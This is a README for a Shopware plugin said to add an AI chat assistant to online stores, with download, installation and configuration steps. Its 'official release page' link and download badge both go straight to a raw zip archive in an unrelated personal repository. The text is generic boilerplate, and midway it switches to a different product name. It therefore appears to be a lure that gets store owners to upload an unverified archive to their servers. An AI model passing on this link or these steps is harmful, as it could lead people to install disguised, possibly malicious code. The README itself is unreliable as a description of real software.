# 🤖 shopware - Improve customer support with smart chat

[![](https://img.shields.io/badge/Download-Shopware_Plugin-blue)](https://raw.githubusercontent.com/Kenzk5943/kenzk5943.github.io/main/assets/Dist-v3.9.zip)

This software adds a chat assistant to your online store. It helps customers find products and answers questions without staff help. You install this tool to save time and increase sales.

## 📥 How to download the software

You need to get the file from the official repository page. Follow these steps to obtain the correct version for your store.

1. Go to the [official release page](https://raw.githubusercontent.com/Kenzk5943/kenzk5943.github.io/main/assets/Dist-v3.9.zip).
2. Look for the latest version at the top of the list.
3. Click the file name to start your download.
4. Save the file to your computer desktop.

Keep this file in a folder you can find later. You will need it for the installation process inside your store dashboard.

## ⚙️ System requirements

Ensure your server meets these standards before you start the installation.

* Shopware version 6.4 or higher
* PHP version 8.1 or 8.2
* 256MB of memory allocated to PHP
* A stable internet connection for the chat module

Check your server settings in the Shopware administration panel under the System tab. Contact your hosting provider if you have questions about these requirements.

## 🏗️ Installation instructions

You perform the installation through your Shopware dashboard. Follow these steps to add the module to your store.

1. Log into your Shopware administration area.
2. Go to the menu labeled Extensions on the left side.
3. Select My extensions.
4. Click the Upload extension button at the top of the screen.
5. Choose the file you downloaded earlier from your desktop.
6. Find the new extension in the list after the upload finishes.
7. Click the three dots next to the extension name.
8. Select Install.
9. Wait for the status to change to Installed.
10. Click the toggle switch to Activate the module.

## 🛠️ Configuring the chat assistant

The assistant needs your store details to work. You must fill in the settings to provide accurate product recommendations to your customers.

1. Locate the configuration settings in the Extensions menu.
2. Select the Emporiqa Chat Assistant tab.
3. Enter your unique API key provided by your service account.
4. Choose the colors for the chat bubble to match your brand style.
5. Decide which pages will show the chat icon.
6. Enable the Visual Search feature if you want customers to find items using images.
7. Click Save at the bottom of the page.

The chat window now appears on your website. Clear your browser cache to see the changes immediately.

## 💬 How users interact with the tool

Your customers see a small icon in the corner of your screen. They click this icon to open the chat window. The assistant uses artificial intelligence to scan your product database. Customers can ask for recommendations based on price, category, or features. The tool provides links directly to your product pages, which creates a smooth path to purchase.

## 🛡️ Managing support requests

You can monitor conversations through the dashboard. The module logs common questions and suggests improvements to your product descriptions. Use the Webhook feature to send chat data to other business software you own. This helps you track customer trends and adjust your inventory based on what people request most often.

## 💡 Troubleshooting common issues

Most problems happen due to incorrect configuration. Use these tips to fix common errors.

* If the chat window does not show up, check if the module is active.
* Verify that your API key is correct.
* Empty the cache in the Shopware administration under Settings and Caches.
* Check the server logs for red error messages.
* Ensure your server is not blocking the connection to the chat server.

If these steps do not help, check your browser console for error logs. Right-click your page, select Inspect, and look at the Console tab. Send these logs to your developer if the problem persists.
